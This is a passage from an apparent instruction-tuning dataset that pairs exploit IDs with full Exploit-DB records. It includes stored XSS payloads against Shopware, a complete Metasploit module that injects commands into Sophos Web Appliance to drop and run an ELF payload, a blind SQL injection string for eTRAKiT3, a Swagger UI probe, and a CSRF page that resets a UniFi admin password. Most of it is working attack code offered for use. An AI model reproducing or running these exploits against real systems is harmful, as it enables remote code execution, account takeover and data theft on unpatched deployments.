\"><div class=\"x-grid-cell-inner \"\nstyle=\"text-align: left; ;\">&nbsp;</div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1432   \">\n<div class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">Rechnung</div></td><td class=\" x-grid-cell\nx-grid-cell-gridcolumn-1433   \"><div class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">Standard Versand</div></td>\n<td class=\" x-grid-cell x-grid-cell-gridcolumn-1434   \"><div class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">\nHauptshop Deutsch</div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1435   \"><div class=\"x-grid-cell-inner \"\nstyle=\"text-align: left; ;\">Mar'Da>\"<iframe src=\"evil.source\" onload=\"alert(\"PTEST\")[PERSISTENT SCRIPT CODE EXECUTION!]\" <=\"\"\nkorat=\"\">\"<iframe src=evil.source onload=alert(\"PTEST\")[PERSISTENT SCRIPT CODE EXECUTION!] <</div></td><td class=\" x-grid-cell\nx-grid-cell-gridcolumn-1436 \" ><div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\"><a href=\"mailto:mardakorat@cuvox.de\"\ndata-qtip=\"mardakorat@cuvox.de\">mardakorat@cuvox.de</a></div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1437\n\" ><div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">Offen</div></td><td class=\" x-grid-cell\nx-grid-cell-gridcolumn-1438   \" ><div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">Offen</div></td>\n<td class=\" x-grid-cell x-grid-cell-actioncolumn-1405   x-action-col-cell x-grid-cell-last\" >\n<div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">\n<img alt=\"\" src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\"\nclass=\"x-action-col-icon x-action-col-0  sprite-user \" data-qtip=\"Kunde \u00f6ffnen\" data-action=\"openCustomer\"  />\n<img alt=\"\" src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\"\nclass=\"x-action-col-icon x-action-col-1  sprite-minus-circle-frame \" data-qtip=\"Bestellung l\u00f6schen\"\ndata-action=\"deleteOrder\"  /><img alt=\"\" src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\"\nclass=\"x-action-col-icon x-action-col-2  sprite-pencil \" data-qtip=\"Zeige Details\" data-action=\"editOrder\"  /></div></td></tr>\n<tr class=\"x-grid-row \" ><td class=\" x-grid-cell x-grid-cell-gridcolumn-1496  x-grid-cell-special\nx-grid-cell-row-checker x-grid-cell-first\" ><div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">\n<div class=\"x-grid-row-checker\">&#160;</div></div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1428   \" >\n<div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">19.08.2016 15:50</div></td><td class=\" x-grid-cell\nx-grid-cell-gridcolumn-1429   \" ><div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">20051</div></td>\n<td class=\" x-grid-cell x-grid-cell-gridcolumn-1430   \" ><div  class=\"x-grid-cell-inner \"\nstyle=\"text-align: left; ;\">308,75</div></td><td class=\" x-grid-cell x-grid-cell-gridcolumn-1431   \" >\n<div  class=\"x-grid-cell-inner \" style=\"text-align: left; ;\">&#160;</div></td>\n\n\nPoC: Vulnerable Source (Execution in Customers - Kunden)\n<div class=\"x-window x-customer-detail-window x-layer x-window-default x-closable x-window-closable x-window-default-closable\"\nstyle=\"left: 124px; top: 26px; width: 1093px; height: 458px; z-index: 39041;\" id=\"customer-detail-window-2311\" tabindex=\"-1\">\n<div style=\"-moz-user-select: none; left: -1px; top: -1px; width: 1093px;\" class=\"x-window-header x-window-header-draggable\nx-docked x-window-header-default x-horizontal x-window-header-horizontal x-window-header-default-horizontal x-top\nx-window-header-top x-window-header-default-top x-docked-top x-window-header-docked-top x-window-header-default-docked-top\nx-unselectable\" id=\"customer-detail-window-2311_header\"><div style=\"width: 1091px;\" id=\"customer-detail-window-2311_header-body\"\nclass=\"x-window-header-body x-window-header-body-default x-window-header-body-horizontal x-window-header-body-default-horizontal\nx-window-header-body-top x-window-header-body-default-top x-window-header-body-docked-top x-window-header-body-default-docked-top\nx-window-header-body-default-horizontal x-window-header-body-default-top x-window-header-body-default-docked-top x-box-layout-ct\">\n<div style=\"width: 1066px; height: 154px;\" id=\"customer-detail-window-2311_header-innerCt\" class=\"x-box-inner \"\nrole=\"presentation\"><div id=\"customer-detail-window-2311_header-targetEl\" style=\"position:absolute;width:20000px;\nleft:0px;top:0px;height:1px\"><div class=\"x-component x-window-header-text-container x-box-item x-component-default\"\nstyle=\"text-align: left; left: 0px; top: 0px; margin: 0px; width: 1049px;\" id=\"customer-detail-window-2311_header_hd\">\n<span id=\"customer-detail-window-2311_header_hd-textEl\" class=\"x-window-header-text x-window-header-text-default\">\nKundenkonto: Mar'Da\"><iframe src=\"evil.source\" onload=\"alert(\"PTEST\")[PERSISTENT SCRIPT CODE EXECUTION!]\" <=\"\"\nkorat\"=\"\"><iframe src=evil.source onload=alert(\"PTEST\")[PERSISTENT SCRIPT CODE EXECUTION!] < (20019)</iframe></span></div>\n<div class=\"x-tool x-box-item x-tool-default\" style=\"width: 15px; height: 15px; left: 1051px; top: 70px; margin: 0px;\" id=\"tool-2312\">\n<img id=\"tool-2312-toolEl\" src=\"data:image/gif;base64,R0lGODlhAQABAID/AMDAwAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\"\nclass=\"x-tool-close\" role=\"presentation\"></div></div></div></div>\n\n\n--- PoC Session Logs [POST] ---\nStatus: 200[OK]\nPOST http://shopware.localhost:8080/backend/customer/save?_dc=1471541475086&customerID=22\nMime Type[application/json]\n   Request Header:\n      Host[shopware.localhost:8080]\n      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]\n      Content-Type[application/json]\n      X-Requested-With[XMLHttpRequest]\n      Referer[http://shopware.localhost:8080/backend/]\n      Cookie[SHOPWAREBACKEND=fv4u2kg63p3ff3ht6kd6var803; test; x-ua-device=desktop; session-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]\nConnection[keep-alive]\nPOST-Daten:\n{\"id\":22,\"groupKey\":\"EK\",\"email\":\"TEST@TEST.de\",\"active\":true,\"accountMode\":0,\"confirmationKey\":\n\"\",\"paymentId\":5,\"firstLogin\":\"2016-08-18T00:00:00\",\"lastLogin\":\"2016-08-18T17:22:23\",\"newsletter\":0,\"validation\":0,\"\nlanguageId\":1,\"shopId\":1,\"priceGroupId\":0,\n\"internalComment\":\"TEST-comment\",\"failedLogins\":0,\"referer\":\"\",\"default_billing_address_id\":22,\"\ndefault_shipping_address_id\":22,\n\"newPassword\":\"\",\"amount\":402.9,\"orderCount\":1,\"canceledOrderAmount\": 0,\"shopName\":\"Hauptshop Deutsch\",\"language\":\"Deutsch\",\"birthday\":\"16.05.1985\",\"title\":\"\",\"\nsalutation\":\"mr\",\"firstname\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source onload=alert(document.cookie) <\",\"\nlastname\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source onload=alert(document.cookie) <\",\n\"number\":\"20028\",\"billing\":[{\"id\":22,\"salutation\":\"mr\",\"company\":\"\",\"\ndepartment\":\"\",\"firstName\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source onload=alert\n(document.cookie) <\",\"title\":\"\",\"lastName\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source onload=alert(document.cookie) <\",\n\"street\":\"Teststrau00dfe\",\"zipCode\":\"72202\",\"city\":\"Nagold\",\"additionalAddressLine1\":\"\",\"additionalAddressLine2\":\"\",\n\"salutationSnippet\":\"Herr\",\"countryId\":2,\"number\":\"\",\"phone\":\"\",\"vat\nId\":\"\",\"stateId\":null}],\"shipping\":[{\"id\":23,\"salutation\":\"mr\",\"company\":\"\",\"department\":\"\",\n\"firstName\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source\nonload=alert(document.cookie) <\",\"title\":\"\",\n\"lastName\":\"TEST[INJECTED SCRIPT CODE]>\"<iframe src=./evi.source onload=alert(document.cookie) <\",\n\"street\":\"Teststrau00dfe\",\"zipCode\":\"72202\",\"city\":\"Nagold\",\"additionalAddressLine1\":\"\",\n\"additionalAddressLine2\":\"\",\"salutationSnippet\":\"Herr\",\"countryId\":2,\"stateId\":null}],\"debit\":\n[],\"paymentData\":[{\"accountNumber\":\"\",\"bankCode\":\"\",\"bankName\":\"\",\"accountHolder\":\"\",\"bic\":\"\",\n\"iban\":\"\",\"useBillingData\":false,\"id\":null}]}]\n   Response Header:\n      Server[nginx/1.8.1]\n      Content-Type[application/json]\n      Connection[keep-alive]\n      Set-Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; path=/backend/; HttpOnly]\n-\nStatus: 200[OK]\nPOST http://shopware.localhost:8080/backend/Log/createLog\nMime Type\n[application/json]\n   Request Header:\n      Host[shopware.localhost:8080]\n      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]\n      Content-Type[application/x-www-form-urlencoded; charset=UTF-8]\n      X-Requested-With[XMLHttpRequest]\n      Referer[http://shopware.localhost:8080/backend/]\n      Cookie[SHOPWAREBACKEND=88g31dgs8lem6cun3ldjq4l3f2; test; x-ua-device=desktop;\n\tsession-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]\n      Connection[keep-alive]\n   POST-Daten:\n      type[backend]\n      key[Kunden]\n      text[Kunde%2020028%20wurde%20gespeichert]\n      user[Demo-Admin]\n      value4[]\n   Response Header:\n      Server[nginx/1.8.1]\n      Content-Type[application/json]\n      Connection[keep-alive]\n      Set-Cookie[SHOPWAREBACKEND=hmb3lqokn3bkr6kvpo1o6vi4o6; path=/backend/; HttpOnly]\n-\nStatus: 200[OK]\nGET http://shopware.localhost:8080/backend/evil.source[PERSISTENT SCRIPT CODE EXECUTE!]\nMime Type[text/html]\n   Request Header:\n      Host[shopware.localhost:8080]\n      User-Agent[Mozilla/5.0 (Windows NT 6.2; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0]\n      Referer[http://shopware.localhost:8080/backend/]\n      Cookie[SHOPWAREBACKEND=p56ursgfdc6f1tbh0s35detvc5; test; x-ua-device=desktop;\n\tsession-1=e7f8815a87d6cfa5552abf58325ca4fa184f7b69f9d45ff7b101c17f7ee0a255;]\n      Connection[keep-alive]\n   Response Header:\n      Server[nginx/1.8.1]\n      Content-Type[text/html; charset=UTF-8]\n      Connection[keep-alive]\n      Set-Cookie[SHOPWAREBACKEND=v3mhes99ai1hsolj8vddjkbci2; path=/backend/; HttpOnly]\n\n\nReference(s):\nhttp://shopware.localhost:8080/\nhttp://shopware.localhost:8080/backend/\nhttp://shopware.localhost:8080/backend/Log/\nhttp://shopware.localhost:8080/backend/customer/\nhttp://shopware.localhost:8080/backend/Log/createLog\nhttp://shopware.localhost:8080/backend/customer/save\nhttp://shopware.localhost:8080/backend/AttributeData/\nhttp://shopware.localhost:8080/backend/AttributeData/list\n\n\nSolution - Fix & Patch:\n=======================\nThe xss vulnerability can be patched by a secure parse of the customer (kunden) and orders (bestellungen) context listings.\nParse or escape the context and disallow special chars during the registration or add to prevent further script code injection attacks.\n\nThe vulnerability can be resolved by an update to version 5.3.4 that is delivered by the manufacturer. The issue risk is marked as moderate.\n\n\n\nSecurity Risk:\n==============\nThe security risk of the stored cross site scripting vulnerabilities in the shopware cms are estimated as medium. (CVSS 4.4)\n\n\nCredits & Authors:\n==================\nVulnerability Laboratory [Research Team] - Benjamin Kunz Mejri [http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.]\n\n\nDisclaimer & Information:\n=========================\nThe information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or\nimplied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any\ncase of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its\nsuppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental\nor consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface\nwebsites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories\nor vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails,\nphone numbers, conversations or anything else to journalists, investigative authorities or private individuals."
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42332",
        "output": {
            "ID": "42332",
            "File": "exploits/json/webapps/42332.rb",
            "Description": "Sophos Web Appliance 4.3.0.2 - 'trafficType' Remote Command Injection (Metasploit)",
            "Date Published": "2017-07-18",
            "Author": "xort",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2017-07-18",
            "Date Updated": "2017-07-18",
            "Verified": "1",
            "Codes": [
                "CVE-2017-6182"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Sophos Web Appliance reporting JSON trafficType Remote Command Injection Vulnerablity\n# Date: 01/28/2017\n# Exploit Author: xort @ Critical Start\n# Vendor Homepage: www.sophos.com\n# Software Link: sophos.com/en-us/products/secure-web-gateway.aspx\n# Version: 4.3.0.2\n# Tested on: 4.3.0.2\n#\n# CVE : (awaiting cve)\n\n# vuln:  report command / trafficType JSON parameter /  ???.php exploit\n\n# Description PostAuth Sophos Web App FW <= v4.3.0.2 for capablities. This exploit leverages a command injection bug.\n#\n# xort @ Critical Start\n\nrequire 'msf/core'\n\nclass MetasploitModule < Msf::Exploit::Remote\n\tRank = ExcellentRanking\n\tinclude  Exploit::Remote::Tcp\n        include Msf::Exploit::Remote::HttpClient\n\n\tdef initialize(info = {})\n\t\tsuper(update_info(info,\n\t\t\t'Name'           => 'Sophos Web Appliace <= v4.3.0.2 JSON reporting remote exploit',\n\t\t\t\t\t'Description'    => %q{\n\t\t\t\t\tThis module exploits a remote command execution vulnerability in\n\t\t\t\tthe Sophos Web Appliace Version <=  v4.3.0.2. The vulnerability exist in\n\t\t\t\ta section of the machine's reporting inferaface that accepts unsanitized\n\t\t\t\tunser supplied information within a JSON query.\n\t\t\t},\n\t\t\t'Author'         =>\n\t\t\t\t[\n\t\t\t\t\t'xort@Critical Start', # vuln + metasploit module\n\t\t\t\t],\n\t\t\t'Version'        => '$Revision: 1 $',\n\t\t\t'References'     =>\n\t\t\t\t[\n\t\t\t\t\t[ 'none', 'none'],\n\t\t\t\t],\n\t\t\t'Platform'      => [ 'linux'],\n\t\t\t'Privileged'     => true,\n\t\t\t 'Arch'          => [ ARCH_X86 ],\n                        'SessionTypes'  => [ 'shell' ],\n\t\t        'Payload'        =>\n                                {\n                                  'Compat' =>\n                                  {\n                                        'ConnectionType' => 'find',\n                                  }\n                                },\n\n\t\t\t'Targets'        =>\n\t\t\t\t[\n\t\t\t\t\t['Linux Universal',\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t'Arch' => ARCH_X86,\n\t\t\t\t\t\t\t\t'Platform' => 'linux'\n\t\t\t\t\t\t}\n\t\t\t\t\t],\n\t\t\t\t],\n\t\t\t'DefaultTarget' => 0))\n\n\t\t\tregister_options(\n\t\t\t\t[\n\t\t\t\t\tOptString.new('PASSWORD', [ false, 'Device password', \"\" ]),\n\t\t\t         \tOptString.new('USERNAME', [ true, 'Device password', \"admin\" ]),\n\t\t\t\t\tOptString.new('CMD', [ false, 'Command to execute', \"\" ]),\n\t\t\t\t\tOpt::RPORT(443),\n\t\t\t\t], self.class)\n\tend\n\n        def do_login(username, password_clear)\n                vprint_status( \"Logging into machine with credentials...\\n\" )\n\n                # vars\n                timeout = 1550;\n                style_key = Rex::Text.rand_text_hex(32)\n\n                # send request\n                res = send_request_cgi(\n                {\n                      'method'  => 'POST',\n                      'uri'     => \"/index.php\",\n                      'vars_get' => {\n\t\t\t   'c' => 'login',\n\t\t\t},\n                      'vars_post' =>\n                        {\n\n       \t\t\t  'STYLE' => style_key,\n \t\t\t  'destination' => '',\n\t\t\t  'section' => '',\n\t\t\t  'username' => username,\n\t\t\t  'password' => password_clear\n                        },\n\t              'headers' => {\n                          'Connection' => 'close',\n                      }\n\n                }, timeout)\n\n                return style_key\n        end\n\n\tdef run_command(username, style_password, cmd)\n\n\t\tvprint_status( \"Running Command...\\n\" )\n\n\t\t# send request with payload\n\t\tres = send_request_cgi({\n\t\t\t'method' => 'POST',\n                        'uri'     => \"/index.php\",\n\t\t\t'vars_post' => {\n\t\t\t\t'chart' => 'pie',\n\t\t\t\t'period' => 'custom',\n\t\t\t\t'multiplier' => '1',\n\t\t\t\t'metric' => '',\n\t\t\t\t'token' => '0.3156784180233425',\n\t\t\t\t'start' => '1/27/2017',\n\t\t\t\t'end' => '1/27/2017',\n\t\t\t\t'filters' => '{\"topn\": \"25\", \"trafficType\": \"out|'+cmd+'&\", \"department\": \"sophos_swa_all_departments\"}',\n\t\t\t\t'pdf' => '1',\n\t\t\t\t'test' => '',\n\t\t\t\t'STYLE' => style_password ,\n\t\t\t\t},\n\t\t\t'vars_get' => {\n\t\t\t\t'c' => 'report',\n\t\t\t\t'name' => 'traf_users',\n\t\t\t\t'STYLE' => style_password ,\n\t\t\t},\n\t\t})\n\n\tend\n\n\n\tdef exploit\n\t\t# timeout\n\t\ttimeout = 1550;\n\n\t\t# params\n\t\tpassword_clear = datastore['PASSWORD']\n\t\tuser = datastore['USERNAME']\n\n\t\t# do authentication\n\t\tstyle_hash = do_login(user, password_clear)\n\n\t\tvprint_status(\"STATUS hash authenticated: #{style_hash}\\n\")\n\n\t\t# pause to let things run smoothly\n\t\tsleep(2)\n\n\t\t #if no 'CMD' string - add code for root shell\n                if not datastore['CMD'].nil? and not datastore['CMD'].empty?\n\n                        cmd = datastore['CMD']\n\n                        # Encode cmd payload\n\n                        encoded_cmd = cmd.unpack(\"H*\").join().gsub(/(\\w)(\\w)/,'\\\\\\\\\\\\\\\\\\\\\\\\\\x\\1\\2')\n\n\t\t\t# upload elf to /tmp/n , chmod +rx /tmp/n , then run /tmp/n (payload)\n                        run_command(user, style_hash, (\"echo -e #{encoded_cmd}>/tmp/n;chmod +rx /tmp/n;/tmp/n\" ))\n                else\n                        # Encode payload to ELF file for deployment\n                        elf = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)\n                        encoded_elf = elf.unpack(\"H*\").join().gsub(/(\\w)(\\w)/,'\\\\\\\\\\\\\\\\\\\\\\\\\\x\\1\\2')\n\n\t\t\t# upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)\n                        run_command(user, style_hash, (\"(echo -e #{encoded_elf}>/tmp/m;chmod +rx /tmp/m;/tmp/m)\"))\n\n\t\t\t# wait for magic\n                        handler\n\n                end\n\n\n\tend\nend"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 42111",
        "output": {
            "ID": "42111",
            "File": "exploits/json/webapps/42111.txt",
            "Description": "Sungard eTRAKiT3 <= 3.2.1.17 - SQL Injection",
            "Date Published": "2017-06-02",
            "Author": "Goran Tuzovic",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2017-06-02",
            "Date Updated": "2017-08-18",
            "Verified": "0",
            "Codes": [
                "CVE-2016-6566"
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "Software: Sungard eTRAKiT3\nVersion: 3.2.1.17 and possibly lower\nCVE: CVE-2016-6566 (https://www.kb.cert.org/vuls/id/846103)\nVulnerable Component:  Login page\n\n\nDescription\n================\nThe login form is vulnerable to blind SQL injection by an unauthenticated user.\n\n\nVulnerabilities\n================\nThe \"valueAsString\" parameter inside the JSON payload contained by the \"ucLogin_txtLoginId_ClientStat\" POST parameter is not properly validated. An unauthenticated remote attacker may modify the POST request and insert a SQL query which will then be executed by the backend server. eTRAKiT 3.2.1.17 was tested, but other versions may also be vulnerable.\n\n\nProof of concept\n================\nSteps to Reproduce:\n\t1. Configure browser to use burp suite as proxy\n\t2. Turn interceptor on in burp suite\n\t3. Attempt to log in to etrakit3 website\n\t4. Modify the resulting HTTP request in the following way\n\t5. Locate the JSON payload contained by the ucLogin_txtLoginId_ClientStat POST parameter\n\t6. Locate the valueAsString parameter inside the JSON payload\n\t7. Append SQL code to the end of the value held by the valueAsString parameter, example: {\"enabled\":true,\"emptyMessage\":\"Username\",\"validationText\":\"fakeuser\",\"valueAsString\":\"fakeuser';waitfor delay'0:0:10'--\",\"lastSetTextBoxValue\":\"fakeuser\"}\n\n\nSolution\n================\n\"SunGard Public Sector appreciates that this issue has been brought to our attention.   Our development team has addressed this report with a patch release.  Please contact the SunGard Public Sector TRAKiT Solutions division to request the patch release.  (858) 451-3030.\" -- (https://www.kb.cert.org/vuls/id/846103)\n\n\nTimeline\n================\n2016-10-17: Discovered\n2016-12-6: CVE Issued\n\n\nDiscovered by\n================\nChris Anastasio 0x616e6173746173696f [ at ] illumant.com\n\n\nAbout Illumant\n================\nIllumant has conducted thousands of security assessment and compliance engagements, helping over 800 clients protect themselves from cyber-attacks.  Through meticulous manual analysis, Illumant helps companies navigate the security and threat landscape to become more secure, less of a target, and more compliant.  For more information, visit https://illumant.com/"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 51379",
        "output": {
            "ID": "51379",
            "File": "exploits/json/webapps/51379.txt",
            "Description": "Swagger UI 4.1.3 - User Interface (UI) Misrepresentation of Critical Information",
            "Date Published": "2023-04-20",
            "Author": "Rafael Cintra Lopes",
            "Type": "webapps",
            "Platform": "json",
            "Port": "",
            "Date Added": "2023-04-20",
            "Date Updated": "2023-04-20",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "# Exploit Title: Swagger UI 4.1.3 - User Interface (UI) Misrepresentation of Critical Information\n# Date: 14 April, 2023\n# Exploit Author: Rafael Cintra Lopes\n# Vendor Homepage: https://swagger.io/\n# Version: < 4.1.3\n# CVE: CVE-2018-25031\n# Site: https://rafaelcintralopes.com.br/\n\n# Usage: python swagger-exploit.py https://[swagger-page].com\n\nfrom selenium import webdriver\nfrom selenium.webdriver.common.desired_capabilities import DesiredCapabilities\nfrom selenium.webdriver.chrome.service import Service\nimport time\nimport json\nimport sys\n\nif __name__ == \"__main__\":\n\n\ttarget = sys.argv[1]\n\n\tdesired_capabilities = DesiredCapabilities.CHROME\n\tdesired_capabilities[\"goog:loggingPrefs\"] = {\"performance\": \"ALL\"}\n\n\toptions = webdriver.ChromeOptions()\n\toptions.add_argument(\"--headless\")\n\toptions.add_argument(\"--ignore-certificate-errors\")\n\toptions.add_argument(\"--log-level=3\")\n\toptions.add_experimental_option(\"excludeSwitches\", [\"enable-logging\"])\n\n\t# Browser webdriver path\n\tdrive_service = Service(\"C:/chromedriver.exe\")\n\n\tdriver = webdriver.Chrome(service=drive_service,\n\t\t\t\t\t\t\toptions=options,\n\t\t\t\t\t\t\tdesired_capabilities=desired_capabilities)\n\n\tdriver.get(target+\"?configUrl=https://petstore.swagger.io/v2/hacked1.json\")\n\ttime.sleep(10)\n\tdriver.get(target+\"?url=https://petstore.swagger.io/v2/hacked2.json\")\n\ttime.sleep(10)\n\n\tlogs = driver.get_log(\"performance\")\n\n\twith open(\"log_file.json\", \"w\", encoding=\"utf-8\") as f:\n\t\tf.write(\"[\")\n\n\t\tfor log in logs:\n\t\t\tlog_file = json.loads(log[\"message\"])[\"message\"]\n\n\t\t\tif(\"Network.response\" in log_file[\"method\"]\n\t\t\t\t\tor \"Network.request\" in log_file[\"method\"]\n\t\t\t\t\tor \"Network.webSocket\" in log_file[\"method\"]):\n\n\t\t\t\tf.write(json.dumps(log_file)+\",\")\n\t\tf.write(\"{}]\")\n\n\tdriver.quit()\n\n\tjson_file_path = \"log_file.json\"\n\twith open(json_file_path, \"r\", encoding=\"utf-8\") as f:\n\t\tlogs = json.loads(f.read())\n\n\tfor log in logs:\n\t\ttry:\n\t\t\turl = log[\"params\"][\"request\"][\"url\"]\n\n\t\t\tif(url == \"https://petstore.swagger.io/v2/hacked1.json\"):\n\t\t\t\tprint(\"[Possibly Vulnerable] \" + target + \"?configUrl=https://petstore.swagger.io/v2/swagger.json\")\n\n\t\t\tif(url == \"https://petstore.swagger.io/v2/hacked2.json\"):\n\t\t\t\tprint(\"[Possibly Vulnerable] \" + target + \"?url=https://petstore.swagger.io/v2/swagger.json\")\n\n\t\texcept Exception as e:\n\t\t\tpass"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 39488",
        "output": {
            "ID": "39488",
            "File": "exploits/json/webapps/39488.txt",
            "Description": "Ubiquiti Networks UniFi 3.2.10 - Cross-Site Request Forgery",
            "Date Published": "2016-02-23",
            "Author": "Julien Ahrens",
            "Type": "webapps",
            "Platform": "json",
            "Port": "8443",
            "Date Added": "2016-02-23",
            "Date Updated": "2016-02-23",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
            "Exploit": "RCE Security Advisory\nhttps://www.rcesecurity.com\n\n\n1. ADVISORY INFORMATION\n-----------------------\nProduct:        Ubiquiti Networks UniFi\nVendor URL:     www.ubnt.com\nType:           Cross-Site Request Forgery [CWE-353]\nDate found:     2015-03-19\nDate published: 2016-02-23\nCVSSv3 Score:   6.3 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L)\nCVE:            -\n\n\n2. CREDITS\n----------\nThis vulnerability was discovered and researched by Julien Ahrens from\nRCE Security.\n\n\n3. VERSIONS AFFECTED\n--------------------\nUniFi v3.2.10\nolder versions may be affected too.\n\n\n4. INTRODUCTION\n---------------\nThe UniFi\u00ae Controller software is a powerful, enterprise wireless software\nengine ideal for high-density client deployments requiring low latency and\nhigh uptime performance. A single UniFi Controller running in the cloud\ncan manage multiple sites: multiple, distributed deployments and\nmulti-tenancy for managed service providers.\n\n(from the vendor's homepage)\n\n\n5. VULNERABILITY DESCRIPTION\n----------------------------\nA generic Cross-Site Request Forgery protection bypass vulnerability was\nidentified in UniFi v3.2.10 and prior.\n\nThe application uses a CSRF protection, which is based on verifying the\nReferer header, but does not catch the case where the Referer header\nis completely missing.\n\nThis leads to a generic CSRF protection bypass, resulting in all\napplication specific functionalities becoming vulnerable. An attacker needs\nto trick the victim to visit an arbitrary website in order to exploit the\nvulnerability. Successful exploits can allow the attacker to compromise the\nwhole application including connected devices, e.g. by changing passwords\nof users, adding new users, changing device usernames and passwords or by\ncreating new WLAN configurations.\n\n\n6. PROOF-OF-CONCEPT\n-------------------\nThe following PoC changes the password of the user \"admin\" to \"csrfpwd\":\n\n<html>\n<head>\n<script>\nfunction load() {\n    var postdata = '<form id=csrf method=POST enctype=\\'text\\/plain\\' action=\\'https://127.0.0.1:8443/api/s/default/cmd/sitemgr\\'>' +\n                    '<input type=hidden name=\\'json=%7B%22name%22%3A%22admin%22%2C%22x_password%22%3A%22csrfpwd%22%2C%22email%22%3A%22info%40mail.com%22%2C%22lang%22%3A%22en_US%22%2C%22cmd%22%3A%22set-self%22%7D\\' value=\\'\\' />' +\n                    '</form>';\n    top.frames[0].document.body.innerHTML=postdata;\n    top.frames[0].document.getElementById('csrf').submit();\n}\n</script>\n</head>\n<body onload=\"load()\">\n<iframe src=\"about:blank\" id=\"noreferer\">< /iframe>\n</body>\n</html>\n\n\n7. SOLUTION\n-----------\nUpgrade to UniFi v4.7.5 or later\n\n\n8. REPORT TIMELINE\n------------------\n2015-03-19: Discovery of the vulnerability\n2015-03-10: Reported via Ubiquiti's Bug Bounty program (hackerone.com)\n2015-06-02: Vendor apologizes his backlog\n2015-09-28: Asking for status update via HackerOne\n2015-09-28: Vendor asks to test against version 4.7.5\n2015-10-02: Verified working fix for v4.7.5\n2015-10-23: Vendor changes status to \"Resolved\"\n2015-11-24: Asking for coordinated disclosure via email\n2015-12-08: No response from vendor\n2015-12-08: Requested public disclosure on HackerOne\n2016-01-08: Report is published automatically\n2016-02-23: Advisory released\n\n\n9. REFERENCES\n-------------\nhttps://www.rcesecurity.com/2016/02/ubiquiti-bug-bounty-unifi-v3-2-10-generic-csrf-protection-bypass\nhttps://hackerone.com/reports/52635"
        }
    },
    {
        "instruction": "Provide detailed information about the given exploit.",
        "input": "Exploit ID: 40030",
        "output": {
            "ID": "40030",
            "File": "exploits/json/webapps/40030.py",
            "Description": "Untangle NGFW 12.1.0 Beta - 'execEvil()' Command Injection",
            "Date Published": "2016-06-28",
            "Author": "Matt Bush",
            "Type": "webapps",
            "Platform": "json",
            "Port": "80",
            "Date Added": "2016-06-28",
            "Date Updated": "2016-06-28",
            "Verified": "0",
            "Codes": [
                ""
            ],
            "Tags": [
                ""
            ],
            "Aliases": [
                ""
            ],
            "Screenshot URL": "",
            "Application URL": "",
            "Source URL": "",
